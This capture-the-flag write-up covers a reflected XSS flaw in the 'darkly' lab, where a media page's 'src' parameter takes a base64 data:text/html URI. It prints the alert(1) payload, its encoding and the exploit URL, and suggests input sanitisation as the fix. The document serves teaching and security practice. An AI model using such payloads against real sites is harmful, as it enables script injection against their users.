# Unchecked Media Source

## Vulnerability

In the middle of the page, the third picture of the NSA is a link redirecting to: [`index.php?page=media&src=nsa`](http://darkly/index.php?page=media&src=nsa).

This page shows an `<object>` element.
The source seems to be controlled by the `src` query.

Any value other than `nsa` does not works.
Using a base64 encoded value seems to work too.

A simple script works:
```html
<script>alert(1)</script>
```

Once encoded to base64, it gives:
```
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

So the URL: [[run]](http://darkly/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
```
http://darkly/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

Give the flag:
```
The flag is : ...
```

## Possible Fix

- Sanitize the user input.
